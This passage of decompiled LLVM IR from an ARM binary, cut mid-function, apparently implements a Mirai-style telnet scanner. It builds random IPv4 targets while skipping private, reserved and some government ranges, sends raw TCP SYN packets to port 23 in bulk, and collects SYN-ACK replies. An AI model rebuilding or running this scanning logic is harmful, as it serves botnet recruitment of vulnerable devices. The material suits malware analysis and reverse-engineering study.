  %v7_10908 = icmp eq i32 %v1_108c4, 192
  store i1 %v7_10908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10908, label %bb258, label %dec_label_pc_10914

bb258:                                            ; preds = %dec_label_pc_10908
  %v8_1090c = icmp eq i32 %v1_108d8, 168
  store i1 %v8_1090c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1090c, label %dec_label_pc_108c0, label %dec_label_pc_10914

dec_label_pc_10914:                               ; preds = %dec_label_pc_10908, %bb258
  %v7_10914 = icmp eq i32 %v1_108c4, 172
  %.322 = zext i1 %v7_10914 to i32
  store i32 %.322, i32* %r3.global-to-local, align 4
  %v7_10920 = icmp eq i32 %v1_108d8, 15
  store i1 %v7_10920, i1* %cpsr_z.global-to-local, align 1
  %tmp422 = icmp ult i32 %v1_108d8, 16
  br i1 %tmp422, label %.thread10, label %bb261

.thread10:                                        ; preds = %dec_label_pc_10914
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10938

bb261:                                            ; preds = %dec_label_pc_10914
  %v2_10928 = icmp eq i1 %v7_10914, false
  store i1 %v2_10928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10928, label %dec_label_pc_10938, label %dec_label_pc_10930

dec_label_pc_10930:                               ; preds = %bb261
  %v7_10930 = icmp eq i32 %v1_108d8, 31
  store i1 %v7_10930, i1* %cpsr_z.global-to-local, align 1
  %tmp423 = icmp ult i32 %v1_108d8, 32
  br i1 %tmp423, label %dec_label_pc_108c0, label %dec_label_pc_10938

dec_label_pc_10938:                               ; preds = %.thread10, %dec_label_pc_10930, %bb261
  %v7_10938 = icmp eq i32 %v1_108c4, 100
  %.323 = zext i1 %v7_10938 to i32
  store i32 %.323, i32* %r3.global-to-local, align 4
  %v7_10944 = icmp eq i32 %v1_108d8, 63
  store i1 %v7_10944, i1* %cpsr_z.global-to-local, align 1
  %tmp424 = icmp ult i32 %v1_108d8, 64
  br i1 %tmp424, label %.thread15, label %bb264

.thread15:                                        ; preds = %dec_label_pc_10938
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1095c

bb264:                                            ; preds = %dec_label_pc_10938
  %v2_1094c = icmp eq i1 %v7_10938, false
  store i1 %v2_1094c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1094c, label %dec_label_pc_1095c, label %dec_label_pc_10954

dec_label_pc_10954:                               ; preds = %bb264
  %v7_10954 = icmp eq i32 %v1_108d8, 126
  store i1 %v7_10954, i1* %cpsr_z.global-to-local, align 1
  %tmp425 = icmp ult i32 %v1_108d8, 127
  br i1 %tmp425, label %dec_label_pc_108c0, label %dec_label_pc_1095c

dec_label_pc_1095c:                               ; preds = %.thread15, %dec_label_pc_10954, %bb264
  %v7_1095c = icmp eq i32 %v1_108c4, 169
  store i1 %v7_1095c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1095c, label %bb265, label %dec_label_pc_10968

bb265:                                            ; preds = %dec_label_pc_1095c
  %v3_10960 = icmp eq i32 %v1_108d8, 255
  store i1 %v3_10960, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10960, label %dec_label_pc_108c0, label %dec_label_pc_10968

dec_label_pc_10968:                               ; preds = %dec_label_pc_1095c, %bb265
  %v7_10968 = icmp eq i32 %v1_108c4, 198
  %.324 = zext i1 %v7_10968 to i32
  store i32 %.324, i32* %r3.global-to-local, align 4
  %v7_10974 = icmp eq i32 %v1_108d8, 17
  store i1 %v7_10974, i1* %cpsr_z.global-to-local, align 1
  %tmp426 = icmp ult i32 %v1_108d8, 18
  br i1 %tmp426, label %.thread21, label %bb268

.thread21:                                        ; preds = %dec_label_pc_10968
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1098c

bb268:                                            ; preds = %dec_label_pc_10968
  %v2_1097c = icmp eq i1 %v7_10968, false
  store i1 %v2_1097c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1097c, label %dec_label_pc_1098c, label %dec_label_pc_10984

dec_label_pc_10984:                               ; preds = %bb268
  %v7_10984 = icmp eq i32 %v1_108d8, 19
  store i1 %v7_10984, i1* %cpsr_z.global-to-local, align 1
  %tmp427 = icmp ult i32 %v1_108d8, 20
  br i1 %tmp427, label %dec_label_pc_108c0, label %dec_label_pc_1098c

dec_label_pc_1098c:                               ; preds = %.thread21, %dec_label_pc_10984, %bb268
  %v2_1098c = icmp ugt i32 %v1_108c4, 222
  %v7_1098c = icmp eq i32 %v1_108c4, 223
  store i1 %v7_1098c, i1* %cpsr_z.global-to-local, align 1
  %v2_10990 = xor i1 %v7_1098c, true
  %v3_10990 = and i1 %v2_1098c, %v2_10990
  br i1 %v3_10990, label %dec_label_pc_108c0, label %dec_label_pc_10994

dec_label_pc_10994:                               ; preds = %dec_label_pc_1098c
  %v1_10994 = add nsw i32 %v1_108c4, -6
  store i32 %v1_10994, i32* %r3.global-to-local, align 4
  %v7_10998 = icmp eq i32 %v1_108c4, 11
  store i1 %v7_10998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10998, label %dec_label_pc_108c0, label %bb269

bb269:                                            ; preds = %dec_label_pc_10994
  %v8_1099c = icmp eq i32 %v1_10994, 1
  store i1 %v8_1099c, i1* %cpsr_z.global-to-local, align 1
  %tmp428 = or i32 %v1_10994, 1
  %tmp429 = icmp eq i32 %tmp428, 1
  br i1 %tmp429, label %dec_label_pc_108c0, label %dec_label_pc_109a4

dec_label_pc_109a4:                               ; preds = %bb269
  %v7_109a4 = icmp eq i32 %v1_108c4, 22
  store i1 %v7_109a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109a4, label %dec_label_pc_108c0, label %bb270

bb270:                                            ; preds = %dec_label_pc_109a4
  %v8_109a8 = icmp eq i32 %v1_108c4, 21
  store i1 %v8_109a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_109a8, label %dec_label_pc_108c0, label %dec_label_pc_109b0

dec_label_pc_109b0:                               ; preds = %bb270
  %v7_109b0 = icmp eq i32 %v1_108c4, 28
  store i1 %v7_109b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109b0, label %dec_label_pc_108c0, label %bb271

bb271:                                            ; preds = %dec_label_pc_109b0
  %v8_109b4 = icmp eq i32 %v1_108c4, 26
  store i1 %v8_109b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_109b4, label %dec_label_pc_108c0, label %dec_label_pc_109bc

dec_label_pc_109bc:                               ; preds = %bb271
  %v7_109bc = icmp eq i32 %v1_108c4, 30
  store i1 %v7_109bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109bc, label %dec_label_pc_108c0, label %bb272

bb272:                                            ; preds = %dec_label_pc_109bc
  %v8_109c0 = icmp eq i32 %v1_108c4, 29
  store i1 %v8_109c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_109c0, label %dec_label_pc_108c0, label %dec_label_pc_109c8

dec_label_pc_109c8:                               ; preds = %bb272
  %v7_109c8 = icmp eq i32 %v1_108c4, 55
  store i1 %v7_109c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109c8, label %dec_label_pc_108c0, label %bb273

bb273:                                            ; preds = %dec_label_pc_109c8
  %v8_109cc = icmp eq i32 %v1_108c4, 33
  store i1 %v8_109cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_109cc, label %dec_label_pc_108c0, label %dec_label_pc_109d4

dec_label_pc_109d4:                               ; preds = %bb273
  %v7_109d4 = icmp eq i32 %v1_108c4, 215
  store i1 %v7_109d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109d4, label %.thread32, label %bb274

bb274:                                            ; preds = %dec_label_pc_109d4
  %v8_109d8 = icmp eq i32 %v1_108c4, 214
  store i1 %v8_109d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_109d8, label %bb275, label %dec_label_pc_109e8

.thread32:                                        ; preds = %dec_label_pc_109d4
  store i32 1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_108c0

bb275:                                            ; preds = %bb274
  store i32 1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_108c0

dec_label_pc_109e8:                               ; preds = %bb274
  store i32 0, i32* %r8.global-to-local, align 4
  %v5_109f4 = call i32 @llvm.bswap.i32(i32 %v0_108c0)
  store i32 %v5_109f4, i32* %r3.global-to-local, align 4
  %tmp276 = and i32 %v0_108c0, 65280
  %tmp277 = call i32 @llvm.bswap.i32(i32 %tmp276)
  %tmp278 = and i32 %v0_108c0, 16711680
  %tmp279 = call i32 @llvm.bswap.i32(i32 %tmp278)
  %v3_10a00 = mul nuw i32 %v3_108e0, 16777216
  %v3_10a04 = udiv i32 %tmp277, 256
  %v4_10a08 = mul nuw nsw i32 %tmp279, 256
  %v4_10a0c = udiv i32 %v5_109f4, 16777216
  store i32 ptrtoint (i8** @global_var_1e3f4.202 to i32), i32* @r0, align 4
  %v5_10a0c = or i32 %v4_10a0c, %v3_10a00
  %v5_10a08 = or i32 %v5_10a0c, %v4_10a08
  %v2_10a14 = or i32 %v5_10a08, %v3_10a04
  store i32 %v2_10a14, i32* %r2.global-to-local, align 4
  store i32 %v2_10a14, i32* @global_var_1e404.301, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i8 0, i8* bitcast (i32* @global_var_1e3fe.302 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1e3ff.303 to i8*), align 4
  %v3_10a28 = call i32 @function_e424(i32 ptrtoint (i8** @global_var_1e3f4.202 to i32), i32 20)
  %sext = mul i32 %v3_10a28, 16777216
  %v1_10a2c = sdiv i32 %sext, 16777216
  store i32 ptrtoint (i8** @global_var_1e3f4.202 to i32), i32* %r0.global-to-local, align 4
  %v3_10a34 = ashr i32 %sext, 31
  %v1_10a38 = trunc i32 %v3_10a34 to i8
  store i8 %v1_10a38, i8* bitcast (i32* @global_var_1e3ff.303 to i8*), align 4
  %v4_10a3c = load i32, i32* @global_var_1e404.301, align 4
  store i32 ptrtoint (i32* @global_var_1e408.206 to i32), i32* %lr.global-to-local, align 4
  store i32 23, i32* %ip.global-to-local, align 4
  store i8 23, i8* bitcast (i32* @global_var_1e40b.211 to i8*), align 4
  store i32 %v4_10a3c, i32* @global_var_1e40c.304, align 4
  %v1_10a50 = trunc i32 %v1_10a2c to i8
  store i8 %v1_10a50, i8* bitcast (i32* @global_var_1e3fe.302 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1e408.206 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_10a60 = load i32, i32* %r8.global-to-local, align 4
  %v1_10a60 = trunc i32 %v0_10a60 to i8
  store i8 %v1_10a60, i8* bitcast (i32* @global_var_1e40a.214 to i8*), align 4
  store i8 %v1_10a60, i8* bitcast (i32* @global_var_1e418.305 to i8*), align 4
  store i8 %v1_10a60, i8* bitcast (i32* @global_var_1e419.306 to i8*), align 4
  %v5_10a6c = call i32 @function_e480(i32 ptrtoint (i8** @global_var_1e3f4.202 to i32), i32 ptrtoint (i32* @global_var_1e408.206 to i32), i32 5120, i32 20)
  %sext3 = mul i32 %v5_10a6c, 16777216
  %v1_10a74 = sdiv i32 %sext3, 16777216
  %v3_10a7c = ashr i32 %sext3, 31
  store i32 %v3_10a7c, i32* @r4, align 4
  %v1_10a88 = trunc i32 %v3_10a7c to i8
  store i8 %v1_10a88, i8* bitcast (i32* @global_var_1e419.306 to i8*), align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v2_10aa0 = load i32, i32* @global_var_1e88c.200, align 4
  store i32 %v2_10aa0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e408.206 to i32), i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1e3f4.202 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v1_10ac8 = trunc i32 %v1_10a74 to i8
  store i8 %v1_10ac8, i8* bitcast (i32* @global_var_1e418.305 to i8*), align 4
  store i32 %v2_10ad0, i32* %lr.global-to-local, align 4
  %v8_10adc = call i32 @function_1372c(i32 %v2_10aa0, i32* bitcast (i8** @global_var_1e3f4.202 to i32*), i32 40, i32 16384, i32 %v2_10ad0, i32 16)
  store i32 %v8_10adc, i32* %r0.global-to-local, align 4
  %v3_10ae0 = load i32, i32* %stack_var_-52, align 4
  %v1_10ae4 = add i32 %v3_10ae0, 1
  store i32 %v1_10ae4, i32* %r3.global-to-local, align 4
  %v8_10ae8 = icmp eq i32 %v1_10ae4, 1024
  store i1 %v8_10ae8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10ae4, i32* %stack_var_-52, align 4
  %v5_10af0 = icmp slt i32 %v1_10ae4, 1024
  br i1 %v5_10af0, label %dec_label_pc_1088c, label %dec_label_pc_10af4

dec_label_pc_10af4:                               ; preds = %dec_label_pc_109e8
  %v0_10af4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10af4, i32* @fp, align 4
  br label %dec_label_pc_10af8

dec_label_pc_10af8:                               ; preds = %dec_label_pc_10874, %dec_label_pc_10af4
  %v0_10af8 = call i32 @function_13470()
  store i32 %v0_10af8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v0_10af8, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v6_10b2c = inttoptr i32 %v0_10c04 to i32*
  %v1_10b54 = add i32 %v0_10c04, 16
  %v2_10b54 = inttoptr i32 %v1_10b54 to i32*
  %v1_10b68 = add i32 %v0_10c04, 9
  %v2_10b68 = inttoptr i32 %v1_10b68 to i8*
  %v4_10b74 = ptrtoint i8* %stack_var_-1876.0 to i32
  %v1_10b7c = add i32 %v4_10b74, 1
  %v2_10b7c = inttoptr i32 %v1_10b7c to i8*
  %v4_10b94 = sext i8 %stack_var_-1868.0 to i32
  %v1_10c74 = bitcast i8* %stack_var_-1876.0 to i32*
  %v1_10b8c = add i32 %v4_10b74, 2
  %v2_10b8c = inttoptr i32 %v1_10b8c to i8*
  %v1_10b90 = add i32 %v4_10b74, 3
  %v2_10b90 = inttoptr i32 %v1_10b90 to i8*
  %v1_10ba4 = add i32 %v4_10b74, 13
  %v2_10ba4 = inttoptr i32 %v1_10ba4 to i8*
  %v1_10bc8 = add i32 %v4_10b74, 8
  %v2_10bc8 = inttoptr i32 %v1_10bc8 to i32*
  %v1_10c04 = add i32 %v0_10c04, 12
  %v2_10c04 = inttoptr i32 %v1_10c04 to i32*
  br label %dec_label_pc_10b08

dec_label_pc_10b08:                               ; preds = %dec_label_pc_10b08.backedge, %dec_label_pc_10af8
  %v1_10b08 = phi i32 [ %v1_10b08.pre, %dec_label_pc_10b08.backedge ], [ %v0_10af8, %dec_label_pc_10af8 ]
  %v0_10b08 = phi i32 [ %v0_10b08.pre, %dec_label_pc_10b08.backedge ], [ 0, %dec_label_pc_10af8 ]
  %v2_10b08 = inttoptr i32 %v1_10b08 to i32*
  store i32 %v0_10b08, i32* %v2_10b08, align 4
  %v2_10b14 = load i32, i32* @global_var_1e88c.200, align 4
  store i32 %v2_10b14, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v0_10c04, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10b24 = load i32, i32* @r5, align 4
  %v7_10b2c = call i32 @function_136cc(i32 %v2_10b14, i32* %v6_10b2c, i32 1514, i32 16384, i32 %v0_10b24, i32 %v0_10b24)
  store i32 %v7_10b2c, i32* %r0.global-to-local, align 4
  %v2_10b30 = icmp eq i32 %v7_10b2c, 0
  store i1 %v2_10b30, i1* %cpsr_z.global-to-local, align 1
  %tmp281 = icmp slt i32 %v7_10b2c, 1
  br i1 %tmp281, label %dec_label_pc_10ca0, label %dec_label_pc_10b38

dec_label_pc_10b38:                               ; preds = %dec_label_pc_10b08
  %v0_10b38 = load i32, i32* @sb, align 4
  %v1_10b38 = inttoptr i32 %v0_10b38 to i32*
  %v2_10b38 = load i32, i32* %v1_10b38, align 4
  store i32 %v2_10b38, i32* %r3.global-to-local, align 4
  %v7_10b3c = icmp eq i32 %v2_10b38, 11
  store i1 %v7_10b3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b3c, label %dec_label_pc_10ca0, label %dec_label_pc_10b44

dec_label_pc_10b44:                               ; preds = %dec_label_pc_10b38
  %v7_10b44 = icmp eq i32 %v7_10b2c, 39
  store i1 %v7_10b44, i1* %cpsr_z.global-to-local, align 1
  %tmp430 = icmp ult i32 %v7_10b2c, 40
  br i1 %tmp430, label %dec_label_pc_10b08.backedge, label %dec_label_pc_10b4c

dec_label_pc_10b4c:                               ; preds = %dec_label_pc_10b44
  store i32 %v0_10c04, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e46c.86 to i32), i32* %ip.global-to-local, align 4
  %v3_10b54 = load i32, i32* %v2_10b54, align 4
  store i32 %v3_10b54, i32* %r2.global-to-local, align 4
  %v2_10b58 = load i32, i32* @global_var_1e46c.86, align 4
  store i32 %v2_10b58, i32* %r3.global-to-local, align 4
  %v9_10b5c = icmp eq i32 %v3_10b54, %v2_10b58
  store i1 %v9_10b5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10b5c, label %dec_label_pc_10b64, label %dec_label_pc_10b08.backedge

dec_label_pc_10b64:                               ; preds = %dec_label_pc_10b4c
  store i32 %v0_10c04, i32* %lr.global-to-local, align 4
  %v3_10b68 = load i8, i8* %v2_10b68, align 1
  %v4_10b68 = zext i8 %v3_10b68 to i32
  store i32 %v4_10b68, i32* %r3.global-to-local, align 4
  %v7_10b6c = icmp eq i8 %v3_10b68, 6
  store i1 %v7_10b6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b6c, label %dec_label_pc_10b74, label %dec_label_pc_10b08.backedge

dec_label_pc_10b74:                               ; preds = %dec_label_pc_10b64
  store i32 %v4_10b74, i32* %r0.global-to-local, align 4
  %v2_10b78 = load i8, i8* %stack_var_-1876.0, align 1
  %v3_10b78 = zext i8 %v2_10b78 to i32
  store i32 %v3_10b78, i32* %r3.global-to-local, align 4
  %v3_10b7c = load i8, i8* %v2_10b7c, align 1
  %v4_10b7c = zext i8 %v3_10b7c to i32
  store i32 %v4_10b7c, i32* %r2.global-to-local, align 4
  %v4_10b80 = mul nuw nsw i32 %v4_10b7c, 256
  %v5_10b80 = or i32 %v4_10b80, %v3_10b78
  store i32 %v5_10b80, i32* %r3.global-to-local, align 4
  %v7_10b84 = icmp eq i32 %v5_10b80, 5888
  store i1 %v7_10b84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b84, label %dec_label_pc_10b8c, label %dec_label_pc_10b08.backedge

dec_label_pc_10b8c:                               ; preds = %dec_label_pc_10b74
  %v3_10b8c = load i8, i8* %v2_10b8c, align 1
  %v4_10b8c = zext i8 %v3_10b8c to i32
  store i32 %v4_10b8c, i32* %r3.global-to-local, align 4
  %v3_10b90 = load i8, i8* %v2_10b90, align 1
  %v4_10b90 = zext i8 %v3_10b90 to i32
  store i32 %v4_10b90, i32* %r2.global-to-local, align 4
  store i32 %v4_10b94, i32* %r1.global-to-local, align 4
  %v4_10b98 = mul nuw nsw i32 %v4_10b90, 256
  %v5_10b98 = or i32 %v4_10b98, %v4_10b8c
  store i32 %v5_10b98, i32* %r3.global-to-local, align 4
  %v9_10b9c = icmp eq i32 %v5_10b98, %v4_10b94
  store i1 %v9_10b9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10b9c, label %dec_label_pc_10ba4, label %dec_label_pc_10b08.backedge

dec_label_pc_10ba4:                               ; preds = %dec_label_pc_10b8c
  %v3_10ba4 = load i8, i8* %v2_10ba4, align 1
  %v4_10ba4 = zext i8 %v3_10ba4 to i32
  store i32 %v4_10ba4, i32* %r3.global-to-local, align 4
  %v1_10ba8 = and i32 %v4_10ba4, 2
  %v2_10ba8 = icmp eq i32 %v1_10ba8, 0
  store i1 %v2_10ba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10ba8, label %dec_label_pc_10b08.backedge, label %dec_label_pc_10bb0

dec_label_pc_10bb0:                               ; preds = %dec_label_pc_10ba4
  %v1_10bb0 = and i32 %v4_10ba4, 16
  %v2_10bb0 = icmp eq i32 %v1_10bb0, 0
  store i1 %v2_10bb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10bb0, label %dec_label_pc_10b08.backedge, label %dec_label_pc_10bb8

dec_label_pc_10bb8:                               ; preds = %dec_label_pc_10bb0
  %v1_10bb8 = and i32 %v4_10ba4, 4
  %v2_10bb8 = icmp eq i32 %v1_10bb8, 0
  store i1 %v2_10bb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10bb8, label %dec_label_pc_10bc0, label %dec_label_pc_10b08.backedge

dec_label_pc_10bc0:                               ; preds = %dec_label_pc_10bb8
  %tmp431 = urem i8 %v3_10ba4, 2
  %v2_10bc0 = icmp eq i8 %tmp431, 0
  store i1 %v2_10bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10bc0, label %dec_label_pc_10bc8, label %dec_label_pc_10b08.backedge

dec_label_pc_10bc8:                               ; preds = %dec_label_pc_10bc0
  %v3_10bc8 = load i32, i32* %v2_10bc8, align 4
  %v2_10be4 = call i32 @llvm.bswap.i32(i32 %v3_10bc8)
  %v1_10be8 = add i32 %v2_10be4, -1
  store i32 %v1_10be8, i32* %r3.global-to-local, align 4
  %v1_10bec = udiv i32 %v1_10be8, 256
  %v3_10bf0 = and i32 %v1_10bec, 65280
  %v3_10bf4 = mul i32 %v1_10be8, 16777216
  %v1_10bf8 = and i32 %v1_10be8, 65280
  store i32 %v1_10bf8, i32* %r1.global-to-local, align 4
  %v4_10bfc = mul nuw nsw i32 %v1_10bf8, 256
  %v5_10bfc = or i32 %v4_10bfc, %v3_10bf4
  store i32 %v5_10bfc, i32* %r0.global-to-local, align 4
  %v4_10c00 = udiv i32 %v1_10be8, 16777216
  %v5_10c00 = or i32 %v3_10bf0, %v4_10c00
  store i32 %v5_10c00, i32* %r2.global-to-local, align 4
  %v3_10c04 = load i32, i32* %v2_10c04, align 4
  store i32 %v3_10c04, i32* %ip.global-to-local, align 4
  %v2_10c08 = call i32 @llvm.bswap.i32(i32 %v1_10be8)
  store i32 %v2_10c08, i32* %r2.global-to-local, align 4
  %v9_10c0c = icmp eq i32 %v2_10c08, %v3_10c04
  store i1 %v9_10c0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10c0c, label %dec_label_pc_10c14, label %dec_label_pc_10b08.backedge

dec_label_pc_10c14:                               ; preds = %dec_label_pc_10bc8
  %v0_10c14 = load i32, i32* @r4, align 4
  %v7_10c14 = icmp eq i32 %v0_10c14, 255
  store i1 %v7_10c14, i1* %cpsr_z.global-to-local, align 1
  %v8_10c18 = icmp sgt i32 %v0_10c14, 255
  br i1 %v8_10c18, label %dec_label_pc_10ca0, label %dec_label_pc_10c1c

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10c14
  %v2_10c24 = load i32, i32* @global_var_1e488.196, align 4
  store i32 %v2_10c24, i32* %r1.global-to-local, align 4
  %v3_10c28 = mul i32 %v0_10c14, 256
  store i32 %v3_10c28, i32* %r2.global-to-local, align 4
  %v2_10c2c = mul i32 %v0_10c14, 288
  store i32 %v2_10c2c, i32* %r3.global-to-local, align 4
  %v2_10c30 = add i32 %v2_10c24, %v2_10c2c
  store i32 %v2_10c30, i32* @r0, align 4
  %v1_10c34 = add i32 %v2_10c30, 12
  %v2_10c34 = inttoptr i32 %v1_10c34 to i32*
  %v3_10c34 = load i32, i32* %v2_10c34, align 4
  store i32 %v3_10c34, i32* %r2.global-to-local, align 4
  %v2_10c38 = icmp eq i32 %v3_10c34, 0
  store i1 %v2_10c38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c38, label %dec_label_pc_10c64, label %dec_label_pc_10c44.preheader

dec_label_pc_10c44.preheader:                     ; preds = %dec_label_pc_10c1c
  %v2_10c3c = add i32 %v2_10c30, 288
  store i32 %v2_10c3c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10c44

dec_label_pc_10c44:                               ; preds = %dec_label_pc_10c44.preheader, %dec_label_pc_10c50
  %v0_10c50 = phi i32 [ %v2_10c3c, %dec_label_pc_10c44.preheader ], [ %v1_10c5c, %dec_label_pc_10c50 ]
  %v0_10c44 = phi i32 [ %v0_10c14, %dec_label_pc_10c44.preheader ], [ %v1_10c44, %dec_label_pc_10c50 ]
  %v1_10c44 = add i32 %v0_10c44, 1
  store i32 %v1_10c44, i32* @r4, align 4
  %v7_10c48 = icmp eq i32 %v1_10c44, 256
  br i1 %v7_10c48, label %dec_label_pc_10ca0.loopexit, label %dec_label_pc_10c50

dec_label_pc_10c50:                               ; preds = %dec_label_pc_10c44
  %v1_10c50 = add i32 %v0_10c50, 12
  %v2_10c50 = inttoptr i32 %v1_10c50 to i32*
  %v3_10c50 = load i32, i32* %v2_10c50, align 4
  store i32 %v3_10c50, i32* %r3.global-to-local, align 4
  %v2_10c54 = icmp eq i32 %v3_10c50, 0
  store i32 %v0_10c50, i32* @r0, align 4
  %v1_10c5c = add i32 %v0_10c50, 288
  store i32 %v1_10c5c, i32* %r2.global-to-local, align 4
  br i1 %v2_10c54, label %dec_label_pc_10c64.loopexit, label %dec_label_pc_10c44

dec_label_pc_10c64.loopexit:                      ; preds = %dec_label_pc_10c50
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10c64

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c64.loopexit, %dec_label_pc_10c1c
  %v2_10c68 = phi i32 [ %v1_10c44, %dec_label_pc_10c64.loopexit ], [ %v0_10c14, %dec_label_pc_10c1c ]
  store i32 ptrtoint (i8* @global_var_1e48c.198 to i32), i32* %r3.global-to-local, align 4
  %v0_10c68 = load i32, i32* @r5, align 4
  %v5_10c68 = mul i32 %v2_10c68, 4
  %v6_10c68 = add i32 %v5_10c68, ptrtoint (i8* @global_var_1e48c.198 to i32)
  %v7_10c68 = inttoptr i32 %v6_10c68 to i32*
  store i32 %v0_10c68, i32* %v7_10c68, align 4
  %v0_10c6c = load i32, i32* %ip.global-to-local, align 4
  %v1_10c6c = load i32, i32* @r0, align 4
  %v2_10c6c = add i32 %v1_10c6c, 16
  %v3_10c6c = inttoptr i32 %v2_10c6c to i32*
  store i32 %v0_10c6c, i32* %v3_10c6c, align 4
  store i32 %v4_10b74, i32* %ip.global-to-local, align 4
  %v2_10c74 = load i32, i32* %v1_10c74, align 4
  store i32 %v2_10c74, i32* %r2.global-to-local, align 4
  %v3_10c78 = sdiv i32 %v2_10c74, 256
  store i32 %v3_10c78, i32* %r3.global-to-local, align 4
  %v1_10c7c = trunc i32 %v3_10c78 to i8
  %v2_10c7c = load i32, i32* @r0, align 4
  %v3_10c7c = add i32 %v2_10c7c, 21
  %v4_10c7c = inttoptr i32 %v3_10c7c to i8*
  store i8 %v1_10c7c, i8* %v4_10c7c, align 1
  %v0_10c80 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c80 = trunc i32 %v0_10c80 to i8
  %v2_10c80 = load i32, i32* @r0, align 4
  %v3_10c80 = add i32 %v2_10c80, 20
  %v4_10c80 = inttoptr i32 %v3_10c80 to i8*
  store i8 %v1_10c80, i8* %v4_10c80, align 1
  %v0_10c84 = call i32 @function_100f8()
  store i32 %v0_10c84, i32* %r0.global-to-local, align 4
  %v1_10b08.pre.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_10b08.backedge

dec_label_pc_10b08.backedge:                      ; preds = %dec_label_pc_10c64, %dec_label_pc_10b44, %dec_label_pc_10ba4, %dec_label_pc_10bb0, %dec_label_pc_10b4c, %dec_label_pc_10b64, %dec_label_pc_10b74, %dec_label_pc_10b8c, %dec_label_pc_10bb8, %dec_label_pc_10bc0, %dec_label_pc_10bc8
  %v1_10b08.pre = phi i32 [ %v1_10b08.pre.pre, %dec_label_pc_10c64 ], [ %v0_10b38, %dec_label_pc_10b44 ], [ %v0_10b38, %dec_label_pc_10ba4 ], [ %v0_10b38, %dec_label_pc_10bb0 ], [ %v0_10b38, %dec_label_pc_10b4c ], [ %v0_10b38, %dec_label_pc_10b64 ], [ %v0_10b38, %dec_label_pc_10b74 ], [ %v0_10b38, %dec_label_pc_10b8c ], [ %v0_10b38, %dec_label_pc_10bb8 ], [ %v0_10b38, %dec_label_pc_10bc0 ], [ %v0_10b38, %dec_label_pc_10bc8 ]
  %v0_10b08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10b08

dec_label_pc_10c8c:                               ; preds = %dec_label_pc_1045c
  store i32 ptrtoint (i32* @global_var_1e88c.200 to i32), i32* %lr.global-to-local, align 4
  %v2_10c90 = load i32, i32* @global_var_1e88c.200, align 4
  store i32 %v2_10c90, i32* %r0.global-to-local, align 4
  %v1_10c94 = call i32 @function_12e9c(i32 %v2_10c90)
  store i32 %v1_10c94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10434, %dec_label_pc_10c8c
  %v0_10c98 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10c98, i32* %r0.global-to-local, align 4
  %v1_10c9c = call i32 @function_14230(i32 %v0_10c98)
  store i32 %v1_10c9c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ca0

